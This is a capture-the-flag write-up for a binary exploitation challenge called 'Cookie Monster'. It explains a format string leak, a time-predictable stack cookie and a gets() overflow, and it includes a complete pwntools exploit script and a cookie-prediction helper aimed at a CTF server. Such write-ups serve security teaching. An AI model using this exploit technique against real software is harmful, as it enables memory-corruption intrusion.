
# Cookie Monster
> xikhud, 13/04/2020.

## Problem
This is a basic BOF problem.

## Vulnerbility
This function contains 3 vulnerbilities:
```cpp
__int64 conversation()
{
  unsigned int v0; // eax
  int v1; // eax
  char v3; // [rsp+Fh] [rbp-11h]
  char s[8]; // [rsp+14h] [rbp-Ch]
  int v5; // [rsp+1Ch] [rbp-4h]

  v0 = time(0LL);
  srand(v0);
  v1 = rand();
  v5 = v1;
  saved_cookie = v1;
  puts("\nOh hello there, what's your name?");
  fgets(s, 8, stdout);
  printf("Hello, ");
  printf(s);
  puts("\nWould you like a cookie?");
  gets(&v3);
  return check_cookie(v5);
}
```

 - First, this function uses `time(0)`, which is predictable.
 - Second, this function uses `printf` with the non-const variable as the first argument, which leads to format string vulnerbility.
 - Third, the `gets` function is unsafe.

## Solution
 - First, predict the result of `time(0)` to get `saved_cookie`.
 - Then, overwrite two LSB of return address with the two LSB of the function that print the flag.
## Final solution
- `solve.py`
```python
from pwn import *
from sys import argv
from subprocess import check_output
#context.log_level = 'debug'
if len(argv) < 2:
    p = process('./cookie_monster')
else:
    p = remote('ctf.umbccd.io', 4200)

cookie = check_output(['./gen']).strip()
cookie = int(cookie.split()[1])
log.info("Cookie: %d" % cookie)

p.sendlineafter('your name?\n', '%11$lx')
p.recvuntil('Hello, ')
r = p.recvline()[:-1]
r = int(r, 16)
r -= 0x134F
base = r
log.info("base: 0x%X" % r)
shell = 'A'*13 + p32(cookie) + 'S'*8 + p64(base + 0x11B5)
assert '\n' not in shell
p.sendlineafter('cookie?', shell)
p.interactive()
```
- `gen.cpp`
```cpp
#include <stdio.h>
#include <stdlib.h>
#include <time.h>
int main()
{
    int t = time(0);
    srand(t);
    int a = rand();
    printf("%d %d\n", t, a);
    return 0;
}
```
And the flag is `????`